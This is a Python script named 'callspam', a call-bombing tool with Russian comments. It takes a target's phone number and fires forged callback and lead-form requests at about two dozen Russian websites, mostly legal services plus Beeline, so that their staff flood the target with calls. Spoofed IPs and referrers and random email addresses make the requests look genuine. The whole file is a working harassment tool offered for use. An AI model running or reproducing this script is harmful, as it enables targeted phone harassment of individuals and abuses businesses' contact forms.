#!/usr/bin/python
# callspam v1
# Author: FSystem88
class callspam:
	def main(self):
		import requests, random, datetime, sys, time, argparse
		from colorama import Fore, Back, Style
		print(Fore.GREEN + '8888888888888888888888888\n8888888888888888888888888\n888        888        888\n888  888888888  8888  888\n888  888888888  888888888\n888  888888888  888888888\n888        888        888\n888  888888888888888  888\n888  888888888888888  888\n888  888888888  8888  888\n888  888888888        888\n8888888888888888888888888\n8888888888888888888888888\n8888    FSystem88    8888\n8888  Call Spammer!  8888\n8888      v.1.0      8888\n8888888888888888888888888\n8888888888888888888888888\n')
		print(Style.RESET_ALL)
		parser = argparse.ArgumentParser(prog='callspam', description="Fucking shit by FSystem88. Возможно что-то уже не работает. Только для России!",epilog='E-mail - FSystem88@bk.ru')
		parser.add_argument('phonenum', metavar='phone', help='Телефонный номер жертвы (пример: 79991231122)')
		parser.add_argument('--name', help='Имя жертвы (по умолчанию: Саша)')
		parser.add_argument('--text', help='Текст с жалобой (по умолчанию: сомнительная компания вымогает деньги)')
		args = parser.parse_args()
		def showstatus(message, type='new'):
			now = datetime.datetime.now().strftime('%H:%M:%S')
			icon = '*'
			if type == 'warn':
				icon = '!'
			else:
				if type == 'new':
					icon == '*'
			message = '[' + icon + '][' + now + ']' + message
			return message
		def wrapsbrace(string, endspace=False):
			if endspace == True:
				return '[' + string + '] '
			return '[' + string + ']'
		def sleep(x):
			try:
				time.sleep(x)
			except KeyboardInterrupt:
				print('\r' + showstatus(wrapsbrace('except', True) + 'KeyboardInterrupt thrown! Exiting . . .', 'warn'))
				exit()
		_name = args.name
		_text = args.text
		_phone = args.phonenum
		if _phone[0] == '+':
			_phone = _phone[1:]
		if _phone[0] == '8':
			_phone = '7'+_phone[1:]
		if _phone[0] == '9':
			_phone = '7'+_phone
		_email = ''
		for x in range(12):
			_email = _email + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		_phoneVodaonline = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7 (999) 666-99-33'
		_phoneBukvaprava = _phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '7(777)777-77-77'
		
		if _name == None:
			_name = 'Саша'
		if _text == None:
			_text = 'сомнительная компания вымогает деньги'

		print(showstatus(wrapsbrace('info', True) + ('Жертва: +{}').format(_phone)))				  
		print(('Имя: {}').format(_name))
		print(('Жалоба: {}').format(_text))
		print('Спамер запущен.\nОтправка. Пожалуйста подождите...')
		
		if _phone == '79153509908':
			print('\n                   ^\nSyntaxError: invalid syntax')
			exit()
		else:
			vodaonline = requests.post('https://www.vodaonline.ru/local/components/shantilab/feedback.form/ajax.php', data={'sessid': '*', 'NAME': _name, 'PHONE': _phoneVodaonline})
			if vodaonline.status_code == 200:
				print(Fore.GREEN + 'www.vodaonline.ru: отправлено')
			else:
				print(Fore.RED + 'www.vodaonline.ru: не отправлено')
			yurmoscow = requests.post('https://yur-moscow.ru/ajax_call_me.php', data={'param1': _phone, 'param3': _text, 'param2': _name})
			if yurmoscow.status_code == 200:
				print(Fore.GREEN + 'yur-moscow.ru: отправлено')
			else:
				print(Fore.RED + 'yur-moscow.ru: не отправлено')
			bukvaprava = requests.post('https://bukvaprava.ru/wp-admin/admin-ajax.php', data={'text_quest_banner': _text,'name': _name,'city':'Москва','tel': _phoneBukvaprava,'ip':'192.168.1.777','form_page':'https://bukvaprava.ru/','referer':'','action':'ajax-lead'})
			if bukvaprava.status_code == 200:
				print(Fore.GREEN + 'bukvaprava.ru: отправлено')
			else:
				print(Fore.RED + 'bukvaprava.ru: не отправлено')
			yuristonline = requests.post('https://www.yurist-online.net/lead_question', data={'region':'27','question': _text,'name': _name,'phone': _phone,'email':'','partner_id':'13'})
			if yuristonline.status_code == 200:
				print(Fore.GREEN + 'www.yurist-online.net: отправлено')
			else:
				print(Fore.RED + 'www.yurist-online.net: не отправлено')
			blablabla = requests.post('http://xn----8sbgev0cabfflr7k.xn--p1ai/scripts/form-u22118.php', data={'custom_U22127':_phoneVodaonline})
			if blablabla.status_code == 200:
				print(Fore.GREEN + 'юрист-авгрупп.рф: отправлено')
			else:
				print(Fore.RED + 'юрист-авгрупп.рф: не отправлено')
			nicecream = requests.post('http://s1.nice-cream.ru/phone-widget2/sendRequest.php', data={'phone': '+'+_phone,'name': _name,'sid': '*','gclid': '0','openstat': 'direct.yandex.ru;12345678;123456789;yandex.ru:premium','utm':''})
			if nicecream.status_code == 200:
				print(Fore.GREEN + 'nice-cream.ru: отправлено')
			else:
				print(Fore.RED + 'nice-cream.ru: не отправлено')
			
			rossovet = requests.post('https://rossovet.ru/qa/msgsave/save', data={'name': _name, 'comment': _text, 'city': 'Москва', 'phoneprefix': '('+_phone[1:4]+')', 'phone': _phone[4:11], 'partnerID': '10', 'ref': 'https://yandex.ru/clck/', 'number1': '7', 'number2': '8', 'checkcode': '15'})
			if rossovet.status_code == 200:
				print(Fore.GREEN + 'rossovet.ru: отправлено')
			else:
				print(Fore.RED + 'rossovet.ru: не отправлено')
			yuridkons = requests.post('https://yuridicheskaya-konsultaciya.com/Home/_FormPost', data={'Name': _name, 'Phone': _phone, 'Description': _text})
			if yuridkons.status_code == 200:
				print(Fore.GREEN + 'yuridicheskaya-konsultaciya.com: отправлено')
			else:
				print(Fore.RED + 'yuridicheskaya-konsultaciya.com: не отправлено')
			epleads = requests.post('https://epleads.ru/gate/api.php', data={'question': _text,'region': 'Москва','first_last_name': _name,'phone': _phone,'ofrid': '1','wid': '3','presetid': '4','referer': 'https://potreb-prava.com/konsultaciya-yurista/konsultaciya-onlajn-yurista-besplatno-kruglosutochno.html','ip': '213.154.55.496','mobile': '0','template': 'form_master.new.fix.metrik_lawyer-blue-default','product': 'lawyer','userSoftData': '*'})
			if epleads.status_code == 200:
				print(Fore.GREEN + 'epleads.ru: отправлено')
			else:
				print(Fore.RED + 'epleads.ru: не отправлено')
			pravonedv = requests.post('https://pravonedv.ru/proxy_8d34201a5b.php?a___=1', data={'email': _email+'@mail.ru','phone': _phoneVodaonline,'location': 'Москва, Россия','name': _name,'offer': '0','ip': '263.87.162.98','device': 'desktop','token': '*','template': 'two_page3','referrer': 'https://yandex.ru/clck/','domain': 'pravonedv.ru','wm_id': '548','url': 'https://pravonedv.ru/besplatnye-onlajn-konsultacii-yurista'})
			if pravonedv.status_code == 200:
				print(Fore.GREEN + 'pravonedv.ru: отправлено')
			else:
				print(Fore.RED + 'pravonedv.ru: не отправлено')
			rdftgbhnj = requests.post('https://xn----etbqwledi5fza.xn--p1ai/wp-json/contact-form-7/v1/contact-forms/295/feedback', data={'_wpcf7': '295','_wpcf7_version': '5.0.5','_wpcf7_locale': 'ru_RU','_wpcf7_unit_tag': 'wpcf7-f295-o2','_wpcf7_container_post': '0','text-838': _name,'tel-231': _phone,'textarea-472': _text,'hidden-278': 'Главная'})
			if rdftgbhnj.status_code == 200:
				print(Fore.GREEN + 'гос-юристы.рф: отправлено')
			else:
				print(Fore.RED + 'гос-юристы.рф: не отправлено')
			gurist = requests.post('http://www.gurist.ru/wp-json/contact-form-7/v1/contact-forms/3591/feedback', data={'_wpcf7': '3591','_wpcf7_version': '5.0','_wpcf7_locale': 'ru_RU','_wpcf7_unit_tag': 'wpcf7-f3591-o1','_wpcf7_container_post': '0','your-name': _name,'tel-147': _text})
			if gurist.status_code == 200:
				print(Fore.GREEN + 'gurist.ru: отправлено')
			else:
				print(Fore.RED + 'gurist.ru: не отправлено')
			beeline = requests.post('https://moskva.beeline.ru/customers/products/mobile/services/createmnporder/', data={'leadName':'PodborSim','phone':_phone[1:11],'region':'98140'})
			if beeline.status_code == 200:
				print(Fore.GREEN + 'moskva.beeline.ru: отправлено')
			else:
				print(Fore.RED + 'moskva.beeline.ru: не отправлено')
			advokatmakeev = requests.post('https://advokatmakeev.ru/form.php', data={'oname': _name,'otel': _phoneVodaonline,'omail': '','omess': _text,'otype': '1'})
			if advokatmakeev.status_code == 200:
				print(Fore.GREEN + 'advokatmakeev.ru: отправлено')
			else:
				print(Fore.RED + 'advokatmakeev.ru: не отправлено')
			mkamsk = requests.post('http://mkamsk.ru/apply_auto_form', data={'Form[9]': _name,'Form[12]': _phone,'Form[11]': _text,'url': 'http://mkamsk.ru/','check': 'check'})
			if mkamsk.status_code == 200:
				print(Fore.GREEN + 'mkamsk.ru: отправлено')
			else:
				print(Fore.RED + 'mkamsk.ru: не отправлено')
			usachev = requests.post('https://usachev.vip/wp-admin/admin-ajax.php', data={'action': 'bazz_widget_action','phone': '+'+_phone,'name': ''})
			if usachev.status_code == 200:
				print(Fore.GREEN + 'usachev.vip: отправлено')
			else:
				print(Fore.RED + 'usachev.vip: не отправлено')
			pravosfera = requests.post('http://pravo-sfera.ru/auxpage_zayavk/', data={'c_name': _name, 'c_tel' : _phoneVodaonline, 'quest': _text, 'uest_go': 'Задать вопрос'})
			if usachev.status_code == 200:
				print(Fore.GREEN + 'pravo-sfera.ru: отправлено')
			else:
				print(Fore.RED + 'pravo-sfera.ru: не отправлено')
			uristexpert24 = requests.post('https://urist-expert24.ru/send-lead/', data={'name': _name, 'phone': _phoneVodaonline, 'form-name': 'Заказ обратного звонка'})
			if uristexpert24.status_code == 200:
				print(Fore.GREEN + 'urist-expert24.ru: отправлено')
			else:
				print(Fore.RED + 'urist-expert24.ru: не отправлено')
			lawdivorce = requests.post('http://law-divorce.ru/wp-admin/admin-ajax.php', data={'ip_address': '','ip_country': '','ip_region': '','ip_city': '','url': '','action': 'lld_send_lead','text': _text,'name': _name,'telephone': '+'+_phoneBukvaprava,'city': 'Москва'})
			if lawdivorce.status_code == 200:
				print(Fore.GREEN + 'law-divorce.ru: отправлено')
			else:
				print(Fore.RED + 'law-divorce.ru: не отправлено')
			gosurist = requests.post('http://www.gos-urist.ru/send.php', {'name': _name, 'code': _phone[1:4], 'phone': _phone[4:11], 'issue': _text})
			if gosurist.status_code == 200:
				print(Fore.GREEN + 'www.gos-urist.ru: отправлено')
			else:
				print(Fore.RED + 'www.gos-urist.ruчё: не отправлено')
			ur9911030 = requests.post('http://9911030.ru/orderform.php', {'name': _name, 'phone': _phone, 'message': _text})
			if ur9911030.status_code == 200:
				print(Fore.GREEN + '9911030.ru: отправлено')
			else:
				print(Fore.RED + '9911030.ru: не отправлено')
			findclone = requests.get('https://findclone.ru/register?phone=+'+_phone, params={'phone': '+'+_phone})
			if ur9911030.status_code == 200:
				print(Fore.GREEN + 'findclone.ru: отправлено')
			else:
				print(Fore.RED + 'findclone.ru: не отправлено')
			print('Готово!')
			print(Style.RESET_ALL)
spammer = callspam()
spammer.main()
